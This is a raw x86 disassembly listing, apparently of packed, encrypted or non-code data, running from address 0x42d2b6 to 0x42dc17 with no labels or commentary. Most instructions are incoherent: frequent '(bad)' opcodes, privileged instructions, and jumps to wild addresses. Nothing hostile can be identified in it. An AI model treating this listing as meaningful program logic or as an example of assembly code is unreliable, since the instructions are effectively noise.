  42d2b6:	add    ebx,DWORD PTR [ebx+0x56]
  42d2b9:	sbb    al,0x89
  42d2bb:	dec    eax
  42d2bc:	test   BYTE PTR [ebp-0x1a5e8a64],al
  42d2c2:	add    esp,esi
  42d2c4:	add    al,0x16
  42d2c6:	ss jnp 0x42d2e3
  42d2c9:	cmc    
  42d2ca:	sbb    BYTE PTR [esi+0x7d34e8f0],0x41
  42d2d1:	or     eax,0x5e0d8110
  42d2d6:	inc    esi
  42d2d7:	aam    0xd1
  42d2d9:	call   0xb24826e1
  42d2de:	sub    al,0x31
  42d2e0:	add    eax,0x12f403e8
  42d2e5:	ror    DWORD PTR [esi-0x634a1ec2],0x1
  42d2ec:	ins    DWORD PTR es:[edi],dx
  42d2ed:	test   BYTE PTR [ebx-0xc],0x33
  42d2f1:	adc    dl,BYTE PTR [edi]
	...
  42d30b:	add    ah,bh
  42d30d:	jnp    0x42d320
  42d30f:	(bad)  
  42d310:	cmp    cl,ch
  42d312:	loopne 0x42d347
  42d314:	int3   
  42d315:	(bad)  [ecx-0x63]
  42d318:	scas   eax,DWORD PTR es:[edi]
  42d319:	mov    DWORD PTR [ecx],ebp
  42d31b:	sbb    BYTE PTR [edx],dh
  42d31d:	jl     0x42d339
  42d31f:	lods   al,BYTE PTR ds:[esi]
  42d320:	and    al,BYTE PTR [edx]
  42d322:	jmp    0xe4cfee2a
  42d327:	push   ss
  42d328:	out    dx,al
  42d329:	call   FWORD PTR [ecx-0x2e7c03bc]
  42d32f:	sbb    ecx,DWORD PTR [eax]
  42d331:	or     ah,BYTE PTR [esi-0x65]
  42d334:	sbb    al,0x1a
  42d336:	(bad)  [esi-0x27001748]
  42d33c:	daa    
  42d33d:	mov    WORD PTR [ebp+eax*1+0x68],?
  42d341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d342:	in     al,dx
  42d343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d344:	js     0x42d2d1
  42d346:	out    0xf9,eax
  42d348:	or     BYTE PTR [eax+0x24],0xf9
  42d34c:	pop    es
  42d34d:	mov    WORD PTR [ebp+eax*8+0x47],?
  42d351:	xchg   dl,al
  42d353:	xchg   ecx,eax
  42d354:	pop    esp
  42d355:	xchg   ecx,eax
  42d356:	sti    
  42d357:	jle    0x42d3d4
  42d359:	les    esi,FWORD PTR [ebp+eiz*8-0x1c]
  42d35d:	add    DWORD PTR [ebp+eax*8+0x2b],0xa451503f
  42d365:	dec    ebx
  42d366:	add    cl,ch
  42d368:	shr    BYTE PTR [edx],1
  42d36a:	mov    al,0xe8
  42d36c:	int3   
  42d36d:	xchg   ebp,esp
  42d36f:	lods   al,BYTE PTR ds:[esi]
	...
  42d388:	add    BYTE PTR ds:0x6c9efffc,dh
  42d38e:	xchg   ebp,eax
  42d38f:	sti    
  42d390:	mov    bh,0xfb
  42d392:	pushf  
  42d393:	add    al,0xac
  42d395:	test   DWORD PTR [edi+edi*2],0x7f04fbc7
  42d39c:	(bad)  
  42d39d:	out    dx,eax
  42d39e:	add    al,0x5a
  42d3a0:	sub    bh,BYTE PTR [ecx+ecx*2+0x24]
  42d3a4:	in     eax,dx
  42d3a5:	add    DWORD PTR [edx],esi
  42d3a7:	xchg   DWORD PTR [eax],edx
  42d3a9:	jb     0x42d3bd
  42d3ab:	add    al,0x72
  42d3ad:	jmp    0x7caae831
  42d3b2:	inc    edx
  42d3b3:	or     BYTE PTR [ebx+esi*8-0x7d],ah
  42d3b7:	aaa    
  42d3b8:	sbb    BYTE PTR ds:0xf4338d06,al
  42d3be:	ds call 0x4809c5
  42d3c4:	ret    0xdef2
  42d3c7:	mov    edi,0xb19b865
  42d3cc:	add    BYTE PTR [edx+0x1a8b083a],dh
  42d3d2:	add    ecx,eax
  42d3d4:	loopne 0x42d435
  42d3d6:	shl    bh,cl
  42d3d8:	inc    ebx
  42d3d9:	sbb    DWORD PTR [ecx],ecx
  42d3db:	add    BYTE PTR [edi-0x4d],bl
  42d3de:	mov    BYTE PTR [eax+eax*1],0xc6
  42d3e2:	aam    0x23
  42d3e4:	add    al,0xb
  42d3e6:	fmulp  st(1),st
  42d3e8:	pusha  
  42d3e9:	or     bh,BYTE PTR [esi-0x7]
  42d3ec:	mov    eax,DWORD PTR [eax]
	...
  42d406:	or     al,BYTE PTR [ecx]
  42d408:	arpl   ax,ax
  42d40a:	std    
  42d40b:	jnp    0x42d47c
  42d40d:	add    al,0x96
  42d40f:	cli    
  42d410:	cli    
  42d411:	ror    BYTE PTR [esi],1
  42d413:	leave  
  42d414:	xor    edx,ecx
  42d416:	aas    
  42d417:	dec    DWORD PTR [edx+ecx*2-0x2a1827c3]
  42d41e:	pop    eax
  42d41f:	add    al,BYTE PTR [eax]
  42d421:	jmp    0x42d432
  42d423:	mov    eax,0xf4cd84bb
  42d428:	push   es
  42d429:	jmp    DWORD PTR [edx-0x2a807d07]
  42d42f:	fdivrp st(6),st
  42d431:	pusha  
  42d432:	mov    bl,BYTE PTR [ecx+0x0]
  42d435:	inc    esp
  42d436:	int    0x1
  42d438:	push   edi
  42d439:	pop    esi
  42d43a:	pop    ds
  42d43b:	add    eax,0xad998b00
  42d440:	(bad)  
  42d441:	cmp    cl,BYTE PTR [ecx+edi*8+0x4844116a]
  42d448:	or     BYTE PTR [ebx-0x23],ch
  42d44b:	call   0xf853249d
  42d450:	add    ebp,eax
  42d452:	out    dx,eax
  42d453:	inc    ebp
  42d454:	add    BYTE PTR [eax],al
  42d456:	xor    eax,edi
  42d458:	add    al,0x0
  42d45a:	push   es
  42d45b:	inc    ecx
  42d45c:	sbb    BYTE PTR [ebx+0x10969cf4],cl
  42d462:	(bad)  
  42d463:	fs jnp 0x42d426
  42d466:	jmp    0x42d498
  42d468:	les    ecx,FWORD PTR [ebp+0x0]
	...
  42d482:	add    BYTE PTR [ebp-0x1f043db2],dh
  42d488:	(bad)  
  42d489:	inc    DWORD PTR [esi+0x18ab3ad]
  42d48f:	(bad)  
  42d490:	data16 das 
  42d492:	add    al,0x7
  42d494:	push   ebp
  42d495:	jnp    0x42d457
  42d497:	sti    
  42d498:	adc    ah,al
  42d49a:	lea    esi,[ebp-0xbfb3a82]
  42d4a0:	xchg   BYTE PTR [ebx],cl
  42d4a2:	and    al,0xf8
  42d4a4:	adc    cl,BYTE PTR [eax+ebx*1+0x7f]
  42d4a8:	pushf  
  42d4a9:	xor    eax,0xd2a3c4fb
  42d4ae:	enter  0xdb70,0x5
  42d4b2:	xchg   ebp,eax
  42d4b3:	xor    eax,0x36fb4420
  42d4b8:	lahf   
  42d4b9:	(bad)  
  42d4ba:	cli    
  42d4bb:	mov    BYTE PTR [edi],al
  42d4bd:	add    BYTE PTR [edi+0x18aa3ad],al
  42d4c3:	inc    esi
  42d4c4:	retf   
  42d4c5:	cs or  al,0x27
  42d4c8:	in     eax,0x7a
  42d4ca:	shl    bl,0x30
  42d4cd:	les    ecx,FWORD PTR [ebp+0x4c4e335]
  42d4d3:	hlt    
  42d4d4:	push   ss
  42d4d5:	dec    esp
  42d4d6:	sbb    BYTE PTR [edi-0x63],bh
  42d4d9:	xchg   esi,eax
  42d4da:	push   eax
  42d4db:	in     al,0xae
  42d4dd:	int3   
  42d4de:	test   BYTE PTR [ebx+edx*4+0x5d81c170],dh
  42d4e5:	xchg   esi,eax
  42d4e6:	mov    edi,0x0
	...
  42d4ff:	add    BYTE PTR [ebx+0x6f03db0a],ch
  42d505:	test   DWORD PTR gs:[esi-0x66c8fb0b],0xcb15f124
  42d510:	jo     0x42d4d7
  42d512:	loop   0x42d582
  42d514:	mov    ch,0x7a
  42d516:	sub    BYTE PTR [ecx-0x7316fec6],bl
  42d51c:	mov    ebp,0x6f036dec
  42d521:	xor    eax,0x812cd4d1
  42d526:	test   eax,0x74c68109
  42d52b:	inc    ebx
  42d52c:	dec    edi
  42d52d:	enter  0x3433,0x79
  42d531:	adc    al,0xf9
  42d533:	shl    bh,0xa4
  42d536:	pop    edi
  42d537:	inc    esp
  42d538:	hlt    
  42d539:	jge    0x42d565
  42d53b:	or     al,0x1c
  42d53d:	ins    DWORD PTR es:[edi],dx
  42d53e:	setns  BYTE PTR [edi]
  42d541:	jle    0x42d535
  42d543:	jmp    0x42d57b
  42d545:	inc    esp
  42d546:	mov    ecx,0xe946d877
  42d54b:	shl    BYTE PTR [edi-0x36277530],0x4
  42d552:	sub    al,BYTE PTR [ecx-0x44]
  42d555:	mov    esp,0xc3f4460d
  42d55a:	stos   BYTE PTR es:[edi],al
  42d55b:	xlat   BYTE PTR ds:[ebx]
  42d55c:	ror    eax,1
  42d55e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d55f:	add    esi,DWORD PTR [edi+0x97a943]
	...
  42d57d:	and    BYTE PTR [edi-0x17],al
  42d580:	shl    BYTE PTR [edi],0x41
  42d583:	repnz (bad) 
  42d585:	adc    DWORD PTR ds:0xde3c4122,eax
  42d58b:	rol    DWORD PTR [ebp-0xc],cl
  42d58e:	jg     0x42d5b2
  42d590:	cmp    bh,BYTE PTR [ebx-0x6e]
  42d593:	lods   eax,DWORD PTR ds:[esi]
  42d594:	fcomip st,st(7)
  42d596:	add    eax,0xc3a58c93
  42d59b:	add    bh,ch
  42d59d:	push   edi
  42d59e:	add    BYTE PTR [eax-0x17],0xeb
  42d5a2:	push   es
  42d5a3:	push   edx
  42d5a4:	rcl    ecx,1
  42d5a6:	retf   
  42d5a7:	(bad)  
  42d5a8:	call   0xab9d9c25
  42d5ad:	or     DWORD PTR [ebx-0x34e1755],0xffffffff
  42d5b4:	js     0x42d5ac
  42d5b6:	dec    ebx
  42d5b7:	jg     0x42d577
  42d5b9:	push   edi
  42d5ba:	sbb    DWORD PTR ds:0x720e7c6a,eax
  42d5c0:	loop   0x42d634
  42d5c2:	xchg   DWORD PTR [eax-0x5a],esp
  42d5c5:	ins    BYTE PTR es:[edi],dx
  42d5c6:	(bad)  
  42d5c7:	jg     0x42d56a
  42d5c9:	or     al,0x18
  42d5cb:	add    al,0xf
  42d5cd:	jno    0x42d596
  42d5cf:	mov    edi,0xffe13462
  42d5d4:	call   0xe98065d0
  42d5d9:	test   DWORD PTR [ecx+eax*1],0x2f364dfd
  42d5e0:	ja     0x42d5e2
	...
  42d5fa:	mov    esi,0xf7e8ff07
  42d5ff:	jns    0x42d605
  42d601:	sbb    BYTE PTR [edi+0x5f38bde3],cl
  42d607:	push   DWORD PTR [edx+0x50e47af5]
  42d60d:	test   eax,0xbad2d1f7
  42d612:	jmp    0x7200:0x90e87079
  42d619:	loop   0x42d68d
  42d61b:	cmp    eax,0x8bde2fb
  42d620:	fcmovu st,st(2)
  42d622:	mov    bh,0x2f
  42d624:	mov    edi,0x8501708f
  42d629:	retf   
  42d62a:	push   es
  42d62b:	inc    ebp
  42d62c:	add    BYTE PTR [eax],al
  42d62e:	pop    ebx
  42d62f:	rcl    DWORD PTR [ebp-0x75],0xf9
  42d633:	(bad)  
  42d634:	dec    edx
  42d635:	push   edi
  42d636:	push   ss
  42d637:	outs   dx,BYTE PTR ds:[esi]
  42d638:	sub    eax,eax
  42d63a:	gs retf 
  42d63c:	or     ecx,DWORD PTR [edi]
  42d63e:	adc    cl,al
  42d640:	dec    eax
  42d641:	and    eax,0xc000069d
  42d646:	adc    al,0x44
  42d648:	cld    
  42d649:	xor    cl,BYTE PTR [ebp+0x2]
  42d64c:	scas   al,BYTE PTR es:[edi]
  42d64d:	enter  0xacf4,0xcc
  42d651:	inc    eax
  42d652:	or     BYTE PTR [ecx+0x0],al
  42d655:	je     0x42d66b
  42d657:	jae    0x42d619
  42d659:	cmp    al,0x5
  42d65b:	mul    ebp
  42d65d:	xor    eax,DWORD PTR [eax]
	...
  42d677:	ss jmp 0x42d5fe
  42d67a:	fistp  DWORD PTR [edx+0xa]
  42d67d:	nop
  42d67e:	add    BYTE PTR [ebp+0x6],cl
  42d681:	div    DWORD PTR [ebp+0x19]
  42d684:	jl     0x42d641
  42d686:	mov    ebp,DWORD PTR [ebx+0x59]
  42d689:	mov    ebx,DWORD PTR cs:0xa6b60706
  42d690:	fdivp  st(7),st
  42d692:	push   esi
  42d693:	mov    dl,BYTE PTR [ebx+0x65d13d3]
  42d699:	test   eax,eax
  42d69b:	and    ecx,edi
  42d69d:	push   es
  42d69e:	mov    dh,0xcd
  42d6a0:	mov    edi,0x451410e0
  42d6a5:	cld    
  42d6a6:	mov    esp,DWORD PTR [ebx-0x30bf0e6b]
  42d6ac:	test   DWORD PTR [ecx+ebp*1+0x23],esi
  42d6b0:	inc    ecx
  42d6b1:	adc    DWORD PTR [eax+0x1aba6a0],eax
  42d6b7:	out    0x9f,al
  42d6b9:	push   es
  42d6ba:	mov    dh,0x1d
  42d6bc:	add    ch,BYTE PTR [esi+0x40d8f40c]
  42d6c2:	pop    ebp
  42d6c3:	xor    al,0x9c
  42d6c5:	add    dh,BYTE PTR [edx+0x5d3fd8f8]
  42d6cb:	xor    al,0x9c
  42d6cd:	sbb    eax,0x1da395c1
  42d6d2:	pop    es
  42d6d3:	lods   al,BYTE PTR ds:[esi]
  42d6d4:	stos   BYTE PTR es:[edi],al
  42d6d5:	dec    edx
  42d6d6:	fstp   DWORD PTR [edi+0xbfd17b]
	...
  42d6f4:	(bad)  
  42d6f5:	push   esp
  42d6f6:	xlat   BYTE PTR ds:[ebx]
  42d6f7:	dec    esp
  42d6f8:	lock daa 
  42d6fa:	add    al,BYTE PTR [esp+esi*4-0x7e3e8f56]
  42d701:	xchg   edi,eax
  42d702:	mov    BYTE PTR [eax],al
  42d704:	cmc    
  42d705:	fwait
  42d706:	jmp    esi
  42d708:	lock pop ss
  42d70a:	mov    edi,0x885c810b
  42d70f:	add    al,0x81
  42d711:	pushf  
  42d712:	add    al,0x0
  42d714:	hlt    
  42d715:	push   0x10
  42d717:	cld    
  42d718:	stos   DWORD PTR es:[edi],eax
  42d719:	retf   
  42d71a:	xchg   edx,eax
  42d71b:	jne    0x42d709
  42d71d:	jp     0x42d70f
  42d71f:	jmp    0x42d728
  42d721:	fadd   QWORD PTR [ebx]
  42d723:	repz dec esp
  42d725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d726:	mov    edi,0xcf863cf3
  42d72b:	jg     0x42d6c6
  42d72d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d72e:	push   DWORD PTR [ebx-0x24]
  42d731:	xor    eax,ebp
  42d733:	cli    
  42d734:	or     ebp,DWORD PTR [edx]
  42d736:	add    dh,BYTE PTR [ebx-0x3f7f46cc]
  42d73c:	adc    BYTE PTR [esi-0x37fbb57a],0x43
  42d743:	push   cs
  42d744:	je     0x42d798
  42d746:	cli    
  42d747:	xor    BYTE PTR [ecx],0xd2
  42d74a:	(bad)  
  42d74b:	push   esp
  42d74d:	std    
  42d74e:	xchg   edx,eax
  42d74f:	jne    0x42d721
  42d751:	add    eax,0x5ca2bb9
  42d756:	jmp    0x42d75e
	...
  42d76f:	add    BYTE PTR [eax],al
  42d771:	fcmovnb st,st(6)
  42d773:	xlat   BYTE PTR ds:[ebx]
  42d774:	ret    
  42d775:	pop    ds
  42d776:	sub    al,0x20
  42d778:	sar    esp,0x4
  42d77b:	outs   dx,BYTE PTR ds:[esi]
  42d77c:	or     BYTE PTR [eax-0x51],bl
  42d77f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d780:	add    eax,DWORD PTR [esi-0x2c]
  42d783:	sub    BYTE PTR [esi],ch
  42d785:	jno    0x42d745
  42d787:	jne    0x42d76c
  42d789:	jp     0x42d755
  42d78b:	js     0x42d73b
  42d78d:	retf   
  42d78e:	add    al,0x6e
  42d790:	lods   eax,DWORD PTR ds:[esi]
  42d791:	jnp    0x42d766
  42d793:	or     eax,0x53f8d010
  42d798:	push   edx
  42d79a:	xchg   dl,al
  42d79c:	psubd  mm0,QWORD PTR [eax+ebp*2-0x3e]
  42d7a1:	in     al,dx
  42d7a2:	cld    
  42d7a3:	call   0x3808faab
  42d7a8:	lods   al,BYTE PTR ds:[esi]
  42d7a9:	and    eax,ebp
  42d7ab:	inc    edx
  42d7ac:	mov    al,BYTE PTR ss:[ecx]
  42d7af:	jmp    0xe1400bde
  42d7b4:	add    esi,esp
  42d7b6:	add    esp,DWORD PTR [edx-0xb83da57]
  42d7bc:	addr16 inc esi
  42d7be:	inc    esp
  42d7bf:	jmp    0x72169ef1
  42d7c4:	rcr    DWORD PTR [ebx-0x7e],1
  42d7c7:	mov    al,ds:0xfc7bd610
  42d7cc:	jae    0x42d7f4
  42d7ce:	inc    esp
  42d7cf:	jmp    0x13c6ea5c
  42d7d4:	xchg   ebp,eax
	...
  42d7ed:	add    BYTE PTR [eax-0x497d5707],al
  42d7f3:	cld    
  42d7f4:	lock add esi,esp
  42d7f7:	retf   
  42d7f8:	daa    
  42d7f9:	adc    ah,ah
  42d7fb:	fwait
  42d7fc:	add    ch,ah
  42d7fe:	push   cs
  42d7ff:	lds    ecx,FWORD PTR [eax]
  42d801:	loope  0x42d7fa
  42d803:	add    al,0xff
  42d805:	sub    bh,BYTE PTR [ebp-0x74]
  42d808:	jne    0x42d7d8
  42d80a:	ss push ds
  42d80c:	leave  
  42d80d:	loope  0x42d7fe
  42d80f:	add    al,0x0
  42d811:	dec    edi
  42d812:	sub    BYTE PTR [ebx+0x635fe93f],dh
  42d818:	inc    eax
  42d819:	jmp    0x7e035915
  42d81e:	xchg   edi,eax
  42d81f:	jle    0x42d85e
  42d821:	cmp    eax,0x4fffc762
  42d826:	popa   
  42d827:	cld    
  42d828:	pop    es
  42d829:	jmp    0x85486425
  42d82e:	dec    ecx
  42d82f:	(bad)  
  42d830:	(bad)  
  42d831:	jmp    0x2b154f80
  42d836:	lock adc BYTE PTR [edx],al
  42d839:	jb     0x42d85e
  42d83b:	loope  0x42d848
  42d83d:	pusha  
  42d83e:	pop    eax
  42d83f:	jle    0x42d804
  42d841:	push   cs
  42d842:	or     al,BYTE PTR [edi+0x4]
  42d845:	jmp    0x2b153120
  42d84a:	clc    
  42d84b:	xor    eax,DWORD PTR [edi+0x74c4ba91]
  42d851:	sub    BYTE PTR [eax],al
	...
  42d86b:	jge    0x42d85e
  42d86d:	(bad)  
  42d86e:	lahf   
  42d86f:	mov    ah,0x4
  42d871:	xchg   DWORD PTR [ecx-0x1ef74232],esi
  42d877:	test   DWORD PTR [ecx*4-0xc70f9a3],0x39076066
  42d882:	pop    esi
  42d883:	repnz std 
  42d885:	add    BYTE PTR [eax-0x11],0xfc
  42d889:	(bad)  
  42d88a:	call   0x130e8c7
  42d88f:	imul   BYTE PTR [eax+0x74]
  42d892:	sbb    ah,BYTE PTR [esi-0x3f]
  42d895:	imul   ecx,ecx,0xfffffad5
  42d89b:	imul   esi,DWORD PTR [eax],0xffffff90
  42d89e:	(bad)  
  42d89f:	sahf   
  42d8a0:	add    ch,al
  42d8a2:	lea    eax,ss:[edx]
  42d8a5:	add    BYTE PTR [ecx+0x43ce1ea0],cl
  42d8ab:	popf   
  42d8ac:	rcl    BYTE PTR [esi-0x3d],1
  42d8af:	mov    BYTE PTR [ebp-0x14],bh
  42d8b2:	push   ebx
  42d8b3:	ss push ss
  42d8b5:	into   
  42d8b6:	inc    ebx
  42d8b7:	(bad)  
  42d8b8:	aad    0xf6
  42d8ba:	adc    eax,0x3b94a5
  42d8bf:	push   ds
  42d8c0:	hlt    
  42d8c1:	pop    es
  42d8c2:	call   DWORD PTR [edx-0x72ff3082]
  42d8c8:	add    bh,BYTE PTR [ebx+0x7d]
  42d8cb:	push   ecx
  42d8cc:	add    al,BYTE PTR [edi]
  42d8ce:	test   BYTE PTR [eax],al
	...
  42d8e8:	mov    al,ds:0xce000001
  42d8ed:	repz lldt WORD PTR [edx+0x7e]
  42d8f2:	mov    ebx,0xf7025d00
  42d8f7:	jne    0x42d93e
  42d8f9:	push   0xffffffc2
  42d8fb:	(bad)  
  42d8fc:	bound  esi,QWORD PTR [edx-0x7b]
  42d8ff:	rcr    al,0x90
  42d902:	div    BYTE PTR [ebp+0x15]
  42d905:	push   0xfffffffd
  42d907:	(bad)  
  42d908:	jb     0x42d97c
  42d90a:	test   eax,eax
  42d90c:	adc    bh,BYTE PTR [esi-0x61]
  42d90f:	add    BYTE PTR ds:0x2945ee02,cl
  42d915:	add    DWORD PTR [esi+0x57],ecx
  42d918:	sub    DWORD PTR [ecx*4-0x1e448],eax
  42d91f:	push   esp
  42d921:	and    BYTE PTR [edx+eax*1-0x4],dl
  42d925:	fwait
  42d926:	jmp    esi
  42d928:	std    
  42d929:	adc    BYTE PTR [esp+eax*1],cl
  42d92c:	jno    0x42d939
  42d92e:	or     BYTE PTR [esp+esi*8],al
  42d931:	fwait
  42d932:	cmp    BYTE PTR [ebp-0x1c],0x9b
  42d936:	jp     0x42d97d
  42d938:	clc    
  42d939:	adc    al,0x49
  42d93b:	or     BYTE PTR [edx+0x6d],cl
  42d93e:	dec    ebp
  42d93f:	add    dh,dh
  42d941:	fwait
  42d942:	(bad)  
  42d943:	cmp    BYTE PTR [ecx-0x74],cl
  42d946:	adc    al,BYTE PTR [ebx+edi*8]
  42d949:	(bad)  
  42d94a:	cmp    BYTE PTR [eax],dl
	...
  42d964:	add    bl,dh
  42d966:	into   
  42d967:	add    eax,0x2f1630b
  42d96c:	mov    edi,0x39b4d
  42d971:	hlt    
  42d972:	loop   0x42d938
  42d974:	jb     0x42d95c
  42d976:	repnz les esp,FWORD PTR [edx-0x33]
  42d97a:	xchg   ebp,eax
  42d97b:	(bad)  
  42d97c:	mov    dl,0x2
  42d97e:	int    0x2
  42d980:	ret    
  42d981:	(bad)  
  42d982:	out    0x9b,al
  42d984:	test   DWORD PTR [ebx+ebx*4-0x6a5cf501],esi
  42d98b:	xor    bh,bl
  42d98d:	leave  
  42d98e:	mov    ds:0x73a4c302,eax
  42d993:	sbb    DWORD PTR [eax-0xc],eax
  42d996:	fwait
  42d997:	sub    DWORD PTR [ecx],eax
  42d999:	loop   0x42d91d
  42d99b:	out    dx,eax
  42d99c:	popa   
  42d99d:	fstp   QWORD PTR [ebp-0x13054d02]
  42d9a3:	add    al,bl
  42d9a5:	(bad)  
  42d9a6:	out    dx,al
  42d9a7:	fwait
  42d9a8:	popa   
  42d9a9:	mov    ah,0x9b
  42d9ab:	dec    DWORD PTR [edx]
  42d9ad:	dec    ebx
  42d9ae:	popf   
  42d9af:	sbb    eax,0x5104a300
  42d9b4:	push   es
  42d9b5:	js     0x42d9bb
  42d9b7:	jmp    0x48520e44
  42d9bc:	add    al,0x51
  42d9be:	or     eax,0xfa043100
  42d9c3:	pop    esp
  42d9c4:	dec    esi
  42d9c5:	mov    BYTE PTR [ebx-0x5a],bl
  42d9c8:	add    eax,DWORD PTR [eax]
	...
  42d9e2:	sub    eax,DWORD PTR [esp+ebx*8-0x173afe11]
  42d9e9:	xor    ch,BYTE PTR [esi]
  42d9eb:	jo     0x42d9d7
  42d9ed:	ss mov edi,0xfbf5fd1a
  42d9f3:	add    al,0xae
  42d9f5:	xor    BYTE PTR [edx+0x15],dh
  42d9f8:	jmp    0xed465337
  42d9fd:	sahf   
  42d9fe:	cld    
  42d9ff:	jmp    0x3e9:0x8f089cf
  42da06:	(bad)  
  42da07:	mov    ebx,0x4f0075b
  42da0c:	jmp    0x398e5d43
  42da11:	cmp    DWORD PTR [ebp+edx*1+0x13f40429],ecx
  42da18:	xchg   edx,eax
  42da19:	mov    dh,al
  42da1b:	or     cl,ch
  42da1d:	add    ebx,edx
  42da1f:	add    eax,0x888e9c12
  42da24:	jmp    0x3488532c
  42da29:	mov    bh,0xaf
  42da2b:	inc    edi
  42da2c:	cmp    dl,BYTE PTR [ecx+0x68]
  42da2f:	pop    ebx
  42da30:	es add al,0xa7
  42da33:	cmp    esp,0xffffffeb
  42da36:	add    ebp,eax
  42da38:	call   0xf16b82c1
  42da3d:	nop
  42da3e:	test   al,0x1a
  42da40:	jp     0x42da5a
  42da42:	ror    BYTE PTR [eax+eax*1],1
  42da45:	add    DWORD PTR [eax],0x0
	...
  42da5f:	test   eax,0x736efb81
  42da64:	inc    ebp
  42da65:	je     0x42da57
  42da67:	mov    ebp,0x8c51f08b
  42da6c:	jg     0x42da69
  42da6e:	push   esi
  42da6f:	es fdivr st,st(2)
  42da72:	hlt    
  42da73:	fist   DWORD PTR [ecx]
  42da75:	inc    eax
  42da76:	jmp    0xe9479d9f
  42da7b:	jg     0x42da36
  42da7d:	test   eax,0xc088f7e9
  42da82:	mov    ch,0x30
  42da84:	xlat   BYTE PTR ds:[ebx]
  42da85:	push   edx
  42da86:	data16 cmp al,0x57
  42da89:	aas    
  42da8a:	jmp    0xf1585a8b
  42da8f:	test   eax,0xc0e0043
  42da94:	sub    DWORD PTR [ecx+edx*1],ecx
  42da97:	icebp  
  42da98:	cmp    ebx,0x857518fe
  42da9e:	(bad)  
  42da9f:	jmp    0x42dac2
  42daa1:	call   0xfbc23f22
  42daa6:	push   0xfffffff5
  42daa8:	jg     0x42dad9
  42daaa:	test   eax,0xed828dcd
  42daaf:	sti    
  42dab0:	add    al,0x0
  42dab2:	inc    edi
  42dab3:	out    dx,eax
  42dab4:	xchg   BYTE PTR [edx],al
  42dab6:	icebp  
  42dab7:	test   DWORD PTR [eax+ebp*8],0xfb7f85f0
  42dabe:	push   ds
  42dabf:	sbb    DWORD PTR gs:[ebx+ebx*8],ebx
	...
  42dadb:	add    BYTE PTR [edi+0x65475b04],dh
  42dae1:	sub    DWORD PTR [edi+esi*8],esi
  42dae4:	mov    bh,0x4
  42dae6:	push   ebp
  42dae7:	bound  edx,QWORD PTR [ebx+0x2c14fad6]
  42daed:	jle    0x42db64
  42daef:	add    BYTE PTR ds:0x9a0c7594,bh
  42daf5:	sbb    cl,BYTE PTR [eax]
  42daf7:	push   DWORD PTR [eax]
  42daf9:	dec    edi
  42dafa:	adc    DWORD PTR [eax+0x1d],eax
  42dafd:	add    al,dh
  42daff:	test   DWORD PTR [ebx+0x52e80f15],esp
  42db05:	fdivp  st(7),st
  42db07:	jmp    DWORD PTR [ecx+0x46]
  42db0a:	je     0x42db1a
  42db0c:	mov    bh,0x7
  42db0e:	dec    esi
  42db0f:	jmp    DWORD PTR [eax-0x1a8a097e]
  42db15:	sahf   
  42db16:	push   cs
  42db17:	dec    BYTE PTR [edx]
  42db19:	xchg   ebp,eax
  42db1a:	add    esi,0x7b
  42db1d:	xor    edi,DWORD PTR [edx-0x7cc432f0]
  42db23:	in     al,dx
  42db24:	add    DWORD PTR [ecx],0x75
  42db27:	adc    al,0x72
  42db29:	xchg   ebp,eax
  42db2a:	jne    0x42db4c
  42db2c:	push   ss
  42db2d:	adc    ecx,DWORD PTR [edi+edi*8]
  42db30:	and    BYTE PTR [edx-0xa],dh
  42db33:	jne    0x42daca
  42db35:	cmp    al,0xf7
  42db37:	jne    0x42dae6
  42db39:	cmp    eax,0x959575f7
  42db3e:	adc    eax,0xf4
	...
  42db57:	add    BYTE PTR [eax],al
  42db59:	add    dh,0xff
  42db5c:	mov    al,dl
  42db5e:	je     0x42dae4
  42db60:	rcl    al,0xc8
  42db63:	test   dh,dh
  42db65:	rcl    DWORD PTR [ebx+eiz*8-0x4],0x85
  42db6a:	or     DWORD PTR [eax],eax
  42db6c:	test   BYTE PTR [ebp+0x538b2b1d],cl
  42db72:	aaa    
  42db73:	sub    ebx,ebx
  42db75:	rcr    BYTE PTR [edx+0x35562974],1
  42db7b:	adc    BYTE PTR [ebx+0x31],dh
  42db7e:	inc    DWORD PTR [ebx]
  42db80:	fcomip st,st(4)
  42db82:	in     al,0x48
  42db84:	and    bh,ch
  42db86:	test   eax,0x816cff0e
  42db8b:	fbld   TBYTE PTR [ebp-0xb]
  42db8e:	add    bl,BYTE PTR [ecx]
  42db90:	and    BYTE PTR [ebx],dl
  42db92:	sub    BYTE PTR [edx-0x886f4fc],0xe7
  42db99:	push   ecx
  42db9a:	jmp    0x16fad729
  42db9f:	sbb    DWORD PTR [eax],esp
  42dba1:	imul   eax,DWORD PTR [ebx+0x27],0x2a703187
  42dba8:	pop    edx
  42dba9:	inc    ecx
  42dbaa:	lock inc DWORD PTR cs:[eax-0x9]
  42dbaf:	lahf   
  42dbb0:	push   edx
  42dbb1:	rol    eax,cl
  42dbb3:	repz cli 
  42dbb5:	inc    ecx
  42dbb6:	pop    esp
  42dbb7:	mov    dh,BYTE PTR [ebp-0x10]
  42dbba:	sub    bl,BYTE PTR [ecx]
  42dbbc:	or     BYTE PTR [eax],al
	...
  42dbd6:	mov    ebx,0x3411df78
  42dbdb:	ins    BYTE PTR es:[edi],dx
  42dbdc:	jbe    0x42dbce
  42dbde:	jno    0x42dbf9
  42dbe0:	or     al,0x25
  42dbe2:	mov    esi,fs
  42dbe4:	pop    ebx
  42dbe5:	add    ah,dh
  42dbe7:	out    0xc3,eax
  42dbe9:	je     0x42dbdb
  42dbeb:	lock xchg ecx,eax
  42dbed:	jne    0x42dbed
  42dbef:	jb     0x42dc09
  42dbf1:	or     BYTE PTR [edi+eax*4+0x567bfb8d],cl
  42dbf8:	std    
  42dbf9:	gs hlt 
  42dbfb:	inc    ecx
  42dbfc:	mov    esi,DWORD PTR [ebp-0x8]
  42dbff:	push   edx
  42dc00:	sbb    BYTE PTR [eax],cl
  42dc02:	dec    esp
  42dc03:	daa    
  42dc04:	xchg   ecx,eax
  42dc05:	sti    
  42dc06:	pop    ebx
  42dc07:	test   ah,0x5a
  42dc0a:	mov    cl,0xad
  42dc0c:	out    dx,eax
  42dc0d:	jmp    DWORD PTR [eax-0x55b0651a]
  42dc13:	add    al,0x6e
  42dc15:	sbb    al,ah
  42dc17:	fstp   DWORD PTR [ecx+0x148dd418]
